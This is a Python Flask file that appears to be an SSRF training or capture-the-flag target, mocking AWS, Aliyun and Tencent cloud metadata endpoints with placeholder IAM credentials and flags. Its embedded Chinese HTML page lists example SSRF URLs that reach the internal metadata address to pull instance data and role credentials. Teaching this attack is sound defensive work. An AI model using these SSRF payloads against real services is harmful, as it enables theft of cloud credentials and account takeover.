from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

AWS_METADATA = {
    '': {'available_paths': ['ami-id', 'hostname', 'local-ipv4', 'public-ipv4', 'instance-id', 'security-groups', 'iam/security-credentials', 'flag']},
    'latest': {'available_paths': ['ami-id', 'hostname', 'local-ipv4', 'public-ipv4', 'instance-id', 'security-groups', 'iam/security-credentials', 'flag']},
    'latest/meta-data/': {'available_paths': ['ami-id', 'hostname', 'local-ipv4', 'public-ipv4', 'instance-id', 'security-groups', 'iam/security-credentials', 'flag']},
    'meta-data/': {'available_paths': ['ami-id', 'hostname', 'local-ipv4', 'public-ipv4', 'instance-id', 'security-groups', 'iam/security-credentials', 'flag']},
    'ami-id': {'ami-id': 'ami-0c55b159cbfafe1f0'},
    'hostname': {'hostname': 'ip-192-168-100-10.ec2.internal'},
    'local-ipv4': {'local-ipv4': '192.168.100.10'},
    'public-ipv4': {'public-ipv4': '54.169.123.45'},
    'instance-id': {'instance-id': 'i-0abcd1234efgh5678'},
    'security-groups': {'security-groups': ['default', 'web-server', 'database']},
    'iam/security-credentials': {'iam/security-credentials': 'admin-role'},
    'iam/security-credentials/admin-role': {
        'Code': 'Success',
        'LastUpdated': '2026-01-15T10:30:00Z',
        'Type': 'AWS-HMAC',
        'AccessKeyId': 'AKIAIOSFODNN7EXAMPLE',
        'SecretAccessKey': 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
        'Token': 'AQoDYXdzEJr...<rest of token>',
        'Expiration': '2026-01-15T16:30:00Z'
    },
    'flag': {'flag': 'FLAG{ssrf_get_request_2026}'},
}

ALIYUN_METADATA = {
    '': {'available_paths': ['hostname', 'instance-id', 'region-id', 'zone-id', 'ram/security-credentials']},
    'ecs': {'available_paths': ['hostname', 'instance-id', 'region-id', 'zone-id', 'ram/security-credentials']},
    'metadata': {'available_paths': ['hostname', 'instance-id', 'region-id', 'zone-id', 'ram/security-credentials']},
    'ecs/metadata': {'available_paths': ['hostname', 'instance-id', 'region-id', 'zone-id', 'ram/security-credentials']},
    'metadata/v1': {'available_paths': ['hostname', 'instance-id', 'region-id', 'zone-id', 'ram/security-credentials']},
    'hostname': {'hostname': 'i-uf6abcd1234xyz.cn-hangzhou.internal'},
    'instance-id': {'instance-id': 'i-uf6abcd1234xyz567890'},
    'region-id': {'region-id': 'cn-hangzhou'},
    'zone-id': {'zone-id': 'cn-hangzhou-a'},
    'ram/security-credentials': {'ram/security-credentials': 'admin-role'},
    'ram/security-credentials/admin-role': {
        'AccessKeyId': 'STS.NUxxxxxxxxxx',
        'AccessKeySecret': 'xxxxxxxxxxxxxxxxxxxxxx',
        'Expiration': '2026-01-15T16:30:00Z',
        'SecurityToken': 'CAISxxxxxxxxxx',
        'LastUpdated': '2026-01-15T10:30:00Z',
        'Code': 'Success'
    },
}

TENCENT_METADATA = {
    '': {'available_paths': ['instance-id', 'instance-type', 'region', 'zone']},
    'cvm': {'available_paths': ['instance-id', 'instance-type', 'region', 'zone']},
    'metadata': {'available_paths': ['instance-id', 'instance-type', 'region', 'zone']},
    'cvm/metadata': {'available_paths': ['instance-id', 'instance-type', 'region', 'zone']},
    'instance-id': {'instance-id': 'ins-12345678'},
    'instance-type': {'instance-type': 'S1.SMALL1'},
    'region': {'region': 'ap-guangzhou'},
    'zone': {'zone': 'ap-guangzhou-1'},
}

HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>云元数据服务</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Microsoft YaHei', Arial, sans-serif; background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); min-height: 100vh; padding: 20px; }
        .container { max-width: 1000px; margin: 0 auto; }
        .header { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); border-radius: 15px; padding: 30px; margin-bottom: 30px; text-align: center; color: white; }
        .header h1 { font-size: 2.5em; margin-bottom: 10px; }
        .card { background: rgba(255, 255, 255, 0.95); border-radius: 15px; padding: 25px; margin-bottom: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2); }
        .card h2 { color: #1e3c72; margin-bottom: 20px; padding-bottom: 10px; border-bottom: 2px solid #1e3c72; }
        .warning { background: #ff6b6b; color: white; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
        .code-block { background: #f8f9fa; border: 1px solid #dee2e6; border-radius: 5px; padding: 15px; font-family: 'Courier New', monospace; overflow-x: auto; margin: 10px 0; }
        table { width: 100%; border-collapse: collapse; margin: 15px 0; }
        th, td { border: 1px solid #dee2e6; padding: 12px; text-align: left; }
        th { background: #1e3c72; color: white; }
        tr:nth-child(even) { background: #f8f9fa; }
        .test-link { background: #1e3c72; color: white; padding: 5px 10px; border-radius: 3px; text-decoration: none; display: inline-block; margin-top: 5px; }
        .test-link:hover { background: #2a5298; }
        .json-response { background: #0f0e17; color: #00ff88; padding: 15px; border-radius: 5px; font-family: 'Courier New', monospace; overflow-x: auto; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>☁️ 云元数据服务</h1>
            <p>Cloud Metadata Service - 模拟AWS/阿里云/腾讯云元数据</p>
        </div>
        <div class="warning">⚠️ 警告：此服务仅限内网访问！如果您能看到此页面，说明存在SSRF漏洞！</div>
        <div class="card">
            <h2>📡 API接口说明</h2>
            <p>本服务提供云元数据模拟API接口，支持AWS、阿里云、腾讯云等云服务商的元数据访问。</p>
        </div>
        <div class="card">
            <h2>🔧 AWS 元数据 API</h2>
            <p>端点：<code>http://localhost:10010/latest/meta-data/{path}</code></p>
            <table>
                <tr><th>API路径</th><th>说明</th><th>操作</th></tr>
                <tr><td><code>/latest/meta-data/</code></td><td>获取所有可用元数据项</td><td><a href="/latest/meta-data/" class="test-link" target="_blank">测试</a></td></tr>
                <tr><td><code>/latest/meta-data/ami-id</code></td><td>获取AMI ID</td><td><a href="/latest/meta-data/ami-id" class="test-link" target="_blank">测试</a></td></tr>
                <tr><td><code>/latest/meta-data/hostname</code></td><td>获取主机名</td><td><a href="/latest/meta-data/hostname" class="test-link" target="_blank">测试</a></td></tr>
                <tr><td><code>/latest/meta-data/local-ipv4</code></td><td>获取内网IP</td><td><a href="/latest/meta-data/local-ipv4" class="test-link" target="_blank">测试</a></td></tr>
                <tr><td><code>/latest/meta-data/instance-id</code></td><td>获取实例ID</td><td><a href="/latest/meta-data/instance-id" class="test-link" target="_blank">测试</a></td></tr>
                <tr><td><code>/latest/meta-data/iam/security-credentials/admin-role</code></td><td>获取IAM凭证</td><td><a href="/latest/meta-data/iam/security-credentials/admin-role" class="test-link" target="_blank">测试</a></td></tr>
                <tr><td><code>/latest/meta-data/flag</code></td><td>获取Flag</td><td><a href="/latest/meta-data/flag" class="test-link" target="_blank">测试</a></td></tr>
            </table>
            <h3>示例请求：</h3>
            <div class="code-block">curl http://localhost:10010/latest/meta-data/instance-id</div>
        </div>
        <div class="card">
            <h2>🔧 阿里云元数据 API</h2>
            <p>端点：<code>http://localhost:10010/ecs/metadata/{path}</code></p>
            <table>
                <tr><th>API路径</th><th>说明</th><th>操作</th></tr>
                <tr><td><code>/ecs/metadata/</code></td><td>获取所有可用元数据项</td><td><a href="/ecs/metadata/" class="test-link" target="_blank">测试</a></td></tr>
                <tr><td><code>/ecs/metadata/instance-id</code></td><td>获取实例ID</td><td><a href="/ecs/metadata/instance-id" class="test-link" target="_blank">测试</a></td></tr>
                <tr><td><code>/ecs/metadata/region-id</code></td><td>获取地域ID</td><td><a href="/ecs/metadata/region-id" class="test-link" target="_blank">测试</a></td></tr>
                <tr><td><code>/ecs/metadata/ram/security-credentials/admin-role</code></td><td>获取RAM凭证</td><td><a href="/ecs/metadata/ram/security-credentials/admin-role" class="test-link" target="_blank">测试</a></td></tr>
            </table>
        </div>
        <div class="card">
            <h2>🔧 腾讯云元数据 API</h2>
            <p>端点：<code>http://localhost:10010/cvm/metadata/{path}</code></p>
            <table>
                <tr><th>API路径</th><th>说明</th><th>操作</th></tr>
                <tr><td><code>/cvm/metadata/</code></td><td>获取所有可用元数据项</td><td><a href="/cvm/metadata/" class="test-link" target="_blank">测试</a></td></tr>
                <tr><td><code>/cvm/metadata/instance-id</code></td><td>获取实例ID</td><td><a href="/cvm/metadata/instance-id" class="test-link" target="_blank">测试</a></td></tr>
                <tr><td><code>/cvm/metadata/region</code></td><td>获取地域</td><td><a href="/cvm/metadata/region" class="test-link" target="_blank">测试</a></td></tr>
            </table>
        </div>
        <div class="card">
            <h2>🚀 SSRF利用示例</h2>
            <div class="code-block"># 通过SSRF访问AWS元数据<br>
http://target.com/ssrf.php?url=http://192.168.100.10/latest/meta-data/instance-id<br>

# 通过SSRF获取云服务凭证<br>
http://target.com/ssrf.php?url=http://192.168.100.10/latest/meta-data/iam/security-credentials/admin-role<br>

# 通过SSRF获取Flag (GET)<br>  
http://target.com/ssrf.php?url=http://192.168.100.10/latest/meta-data/flag<br>

# 通过POST请求获取Flag<br>
# 需要提交SecretAccessKey<br>
POST http://192.168.100.10/getflag<br>
Content-Type: application/json<br>
{"SecretAccessKey": "********************************"}</div>
        </div>
        <div class="card">
            <h2>📋 返回格式</h2>
            <p>所有API接口均返回JSON格式数据：</p>
            <div class="json-response">{"instance-id": "i-0abcd1234efgh5678"}</div>
        </div>
    </div>
</body>
</html>"""


@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)


@app.route('/latest/meta-data/')
@app.route('/latest/meta-data/<path:subpath>')
def aws_metadata(subpath=''):
    path = subpath.strip('/')
    if path in AWS_METADATA:
        return jsonify(AWS_METADATA[path])
    return jsonify({'error': 'Metadata path not found', 'path': path}), 404


@app.route('/ecs/metadata/')
@app.route('/ecs/metadata/<path:subpath>')
def aliyun_metadata(subpath=''):
    path = subpath.strip('/')
    if path in ALIYUN_METADATA:
        return jsonify(ALIYUN_METADATA[path])
    return jsonify({'error': 'Aliyun metadata path not found', 'path': path}), 404


@app.route('/cvm/metadata/')
@app.route('/cvm/metadata/<path:subpath>')
def tencent_metadata(subpath=''):
    path = subpath.strip('/')
    if path in TENCENT_METADATA:
        return jsonify(TENCENT_METADATA[path])
    return jsonify({'error': 'Tencent Cloud metadata path not found', 'path': path}), 404


@app.route('/getflag', methods=['POST'])
def get_flag():
    data = request.get_json(silent=True) or {}
    if not data:
        data = request.form.to_dict() or {}
    key = data.get('SecretAccessKey', 'flag')

    if key == 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY':
        return jsonify({'flag': 'FLAG{ssrf_cloud_metadata_success_2026}'})

    for metadata in [AWS_METADATA, ALIYUN_METADATA, TENCENT_METADATA]:
        if key in metadata:
            return jsonify(metadata[key])

    return jsonify({'error': 'SecretAccessKey not found', 'SecretAccessKey': key}), 404


@app.route('/paths', methods=['GET'])
def get_paths():
    return jsonify({
        'aws': {
            'base': '/latest/meta-data/',
            'paths': list(AWS_METADATA.keys())
        },
        'aliyun': {
            'base': '/ecs/metadata/',
            'paths': list(ALIYUN_METADATA.keys())
        },
        'tencent': {
            'base': '/cvm/metadata/',
            'paths': list(TENCENT_METADATA.keys())
        }
    })


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=True)
